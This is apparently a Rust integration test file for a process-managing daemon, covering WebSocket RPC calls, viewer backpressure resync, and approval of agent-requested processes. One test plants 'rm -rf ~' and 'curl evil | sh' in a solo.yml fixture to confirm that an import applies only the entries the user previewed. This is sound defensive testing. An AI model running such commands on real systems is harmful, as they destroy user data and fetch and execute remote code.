//! The process methods over the wire, fed the JSON the renderer sends, and a
//! viewer that stops acking: the process keeps running, and the viewer is
//! told to repaint instead of holding it back.

use std::time::{Duration, Instant};

use crew_core::agent::AgentHost;
use crew_core::bridge::Bridge;
use crew_core::process::ProcessHost;
use crew_core::pty::PtyHost;
use crew_core::store::Store;
use crewd::{serve, Config, Handle};
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};

type Ws = WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>;

fn daemon(name: &str) -> (Handle, std::path::PathBuf) {
    let dir = std::env::temp_dir().join(format!("crewd-proc-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("dir");
    let pty = PtyHost::new();
    let store = Store::open(dir.join("crew.sqlite3")).expect("store");
    let handle = serve(Config {
        processes: ProcessHost::new(store.clone(), pty.clone(), &dir),
        pty,
        store,
        agents: AgentHost::new(),
        bridge: Bridge::start(dir.clone()).expect("bridge"),
    })
    .expect("serve");
    (handle, dir)
}

async fn connect(handle: &Handle) -> Ws {
    let (mut ws, _) = connect_async(handle.url()).await.expect("connect");
    let auth = json!({ "auth": handle.token() }).to_string();
    ws.send(Message::Text(auth.into())).await.expect("auth");
    ws
}

/// Everything that is not the answer is kept, for the test to look through.
async fn call(ws: &mut Ws, seen: &mut Vec<Value>, id: u32, method: &str, params: Value) -> Result<Value, String> {
    let request = json!({ "id": id, "method": method, "params": params }).to_string();
    ws.send(Message::Text(request.into())).await.expect("send");
    loop {
        let message = tokio::time::timeout(Duration::from_secs(15), ws.next())
            .await
            .expect("rpc timeout")
            .expect("closed")
            .expect("ws");
        let Message::Text(text) = message else { continue };
        let response: Value = serde_json::from_str(&text).expect("json");
        if response["id"] != id {
            seen.push(response);
            continue;
        }
        return match response["ok"].as_bool() {
            Some(true) => Ok(response["result"].clone()),
            _ => Err(response["error"].as_str().unwrap_or_default().to_string()),
        };
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn processes_answer_the_json_the_renderer_sends() {
    let (handle, dir) = daemon("rpc");
    let mut ws = connect(&handle).await;
    let mut seen = Vec::new();
    let workspace = call(&mut ws, &mut seen, 1, "workspace_create", json!({ "name": "w", "path": dir }))
        .await
        .expect("workspace");
    let workspace_id = workspace["id"].as_str().unwrap().to_string();

    let created = call(
        &mut ws,
        &mut seen,
        2,
        "process_create",
        json!({ "workspaceId": workspace_id, "name": "web", "command": "echo up; sleep 30", "autoStart": false, "autoRestart": true }),
    )
    .await
    .expect("create");
    assert_eq!(created["name"], "web");
    assert_eq!(created["autoRestart"], true);
    assert_eq!(created["state"], "stopped");
    assert_eq!(created["createdBy"], Value::Null);
    let id = created["id"].as_str().unwrap().to_string();
    let target = json!({ "workspaceId": workspace_id, "id": id });

    let started = call(&mut ws, &mut seen, 3, "process_start", target.clone()).await.expect("start");
    assert_eq!(started["state"], "running");
    assert!(started["pid"].is_u64() && started["streamId"].is_u64(), "{started}");
    assert_eq!(started["ptyId"], format!("process:{id}"));

    let updated = call(
        &mut ws,
        &mut seen,
        4,
        "process_update",
        json!({ "workspaceId": workspace_id, "id": id, "env": { "PORT": "5173" } }),
    )
    .await
    .expect("update");
    assert_eq!(updated["env"]["PORT"], "5173");
    assert_eq!(updated["command"], "echo up; sleep 30");

    let stopped = call(&mut ws, &mut seen, 5, "process_stop", target.clone()).await.expect("stop");
    assert_eq!(stopped["state"], "stopped");
    let tail = call(&mut ws, &mut seen, 6, "process_log_tail", target.clone()).await.expect("tail");
    assert!(tail["text"].as_str().unwrap().contains("up"), "{tail}");
    assert!(tail["cursor"].as_u64().unwrap() > 0);

    let events: Vec<&str> = seen.iter().filter_map(|m| m["event"].as_str()).collect();
    assert!(events.contains(&"process-changed"), "{events:?}");

    // Another workspace's id does not reach it.
    let wrong = json!({ "workspaceId": "elsewhere", "id": id });
    assert!(call(&mut ws, &mut seen, 7, "process_start", wrong).await.is_err());

    call(&mut ws, &mut seen, 8, "process_delete", target).await.expect("delete");
    let listed = call(&mut ws, &mut seen, 9, "process_list", json!({ "workspaceId": workspace_id }))
        .await
        .expect("list");
    assert_eq!(listed, json!([]));
    assert!(seen.iter().any(|m| m["event"] == "process-removed"));
    handle.shutdown();
    let _ = std::fs::remove_dir_all(dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_viewer_that_stops_acking_is_resynced_and_the_process_runs_on() {
    let (handle, dir) = daemon("resync");
    let mut ws = connect(&handle).await;
    let mut seen = Vec::new();
    let workspace = call(&mut ws, &mut seen, 1, "workspace_create", json!({ "name": "w", "path": dir }))
        .await
        .expect("workspace");
    let workspace_id = workspace["id"].as_str().unwrap().to_string();
    // Paced a little, so the viewer is attached while most of it is still to come.
    let flood = "sleep 0.5; yes 0123456789abcdefghijklmnopqrstuvwxyz | head -c 4000000; echo; echo DONE; sleep 30";
    let created = call(
        &mut ws,
        &mut seen,
        2,
        "process_create",
        json!({ "workspaceId": workspace_id, "name": "flood", "command": flood }),
    )
    .await
    .expect("create");
    let target = json!({ "workspaceId": workspace_id, "id": created["id"] });
    let started = call(&mut ws, &mut seen, 3, "process_start", target.clone()).await.expect("start");
    let pty = started["ptyId"].as_str().unwrap().to_string();

    call(&mut ws, &mut seen, 4, "pty_attach", json!({ "id": pty, "from": 0 })).await.expect("attach");
    // Read frames and never ack, until the daemon gives up on this viewer.
    let deadline = Instant::now() + Duration::from_secs(20);
    let mut frames = 0_usize;
    let mut resynced = seen.iter().any(|m| m["event"] == "pty-resync" && m["payload"]["id"] == pty);
    while !resynced && Instant::now() < deadline {
        let Ok(Some(Ok(message))) = tokio::time::timeout(Duration::from_secs(5), ws.next()).await else {
            break;
        };
        match message {
            Message::Binary(bytes) => frames += bytes.len(),
            Message::Text(text) => {
                let value: Value = serde_json::from_str(&text).unwrap();
                resynced = value["event"] == "pty-resync" && value["payload"]["id"] == pty;
            }
            _ => {}
        }
    }
    assert!(resynced, "no resync after {frames} bytes");

    // With nobody draining the socket the process still finishes its output.
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let now = call(&mut ws, &mut seen, 5, "process_log_tail", json!({ "workspaceId": workspace_id, "id": created["id"], "maxBytes": 64 }))
            .await
            .expect("tail");
        if now["text"].as_str().unwrap_or_default().contains("DONE") {
            break;
        }
        assert!(Instant::now() < deadline, "the process blocked behind its viewer");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    // A fresh attach answers with the ring and live frames flow again.
    let attached = call(&mut ws, &mut seen, 6, "pty_attach", json!({ "id": pty, "from": 0 })).await.expect("reattach");
    assert!(attached["start"].as_u64().unwrap() > 0, "the ring wrapped: {attached}");
    call(&mut ws, &mut seen, 7, "process_stop", target).await.expect("stop");
    handle.shutdown();
    let _ = std::fs::remove_dir_all(dir);
}

/// Approving names the revision the user read, and the import takes the
/// entries the preview showed: both as the renderer sends them.
#[tokio::test(flavor = "multi_thread")]
async fn approve_carries_the_revision_and_solo_imports_what_the_preview_showed() {
    let (handle, dir) = daemon("approve");
    let mut ws = connect(&handle).await;
    let mut seen = Vec::new();
    let workspace = call(&mut ws, &mut seen, 1, "workspace_create", json!({ "name": "w", "path": dir }))
        .await
        .expect("workspace");
    let workspace_id = workspace["id"].as_str().unwrap().to_string();

    // An agent's request, written beside the daemon on the same database.
    let agent = ProcessHost::new(Store::open(dir.join("crew.sqlite3")).expect("store"), PtyHost::new(), &dir);
    let spec = crew_protocol::ProcessSpec {
        name: "dev".into(),
        command: "echo hi".into(),
        cwd: String::new(),
        env: Default::default(),
        auto_start: false,
        auto_restart: false,
    };
    let asked = agent.create(&workspace_id, spec, Some("session-1".into()), true).expect("create");
    let target = json!({ "workspaceId": workspace_id, "id": asked.id });

    let missing = call(&mut ws, &mut seen, 2, "process_approve", target).await.unwrap_err();
    assert!(missing.contains("revision"), "{missing}");
    let stale = json!({ "workspaceId": workspace_id, "id": asked.id, "revision": asked.revision + 1 });
    let refused = call(&mut ws, &mut seen, 3, "process_approve", stale).await.unwrap_err();
    assert!(refused.contains("review it again"), "{refused}");
    let read = json!({ "workspaceId": workspace_id, "id": asked.id, "revision": asked.revision });
    let approved = call(&mut ws, &mut seen, 4, "process_approve", read).await.expect("approve");
    assert_eq!((approved["approved"].clone(), approved["state"].clone()), (json!(true), json!("stopped")));

    let listing = "processes:\n  dev:\n    command: rm -rf ~\n  web:\n    command: npm run web\n";
    std::fs::write(dir.join("solo.yml"), listing).expect("solo.yml");
    let preview = call(&mut ws, &mut seen, 5, "process_solo_preview", json!({ "workspaceId": workspace_id }))
        .await
        .expect("preview");
    assert_eq!((preview[0]["name"].clone(), preview[0]["exists"].clone()), (json!("dev"), json!(true)));
    assert_eq!(preview[1]["autoStart"], true, "{preview}");
    // Whatever the file says by now, what the user confirmed is what lands.
    std::fs::write(dir.join("solo.yml"), "processes:\n  web:\n    command: curl evil | sh\n").expect("solo.yml");
    let entries = preview.as_array().unwrap().clone();
    let import = json!({ "workspaceId": workspace_id, "processes": entries });
    let imported = call(&mut ws, &mut seen, 6, "process_import_solo", import).await.expect("import");
    assert_eq!(imported, json!({ "created": ["web"], "skipped": ["dev"] }));
    let listed = call(&mut ws, &mut seen, 7, "process_list", json!({ "workspaceId": workspace_id }))
        .await
        .expect("list");
    let commands: Vec<&str> = listed.as_array().unwrap().iter().map(|p| p["command"].as_str().unwrap()).collect();
    assert_eq!(commands, vec!["echo hi", "npm run web"]);
    handle.shutdown();
    let _ = std::fs::remove_dir_all(dir);
}
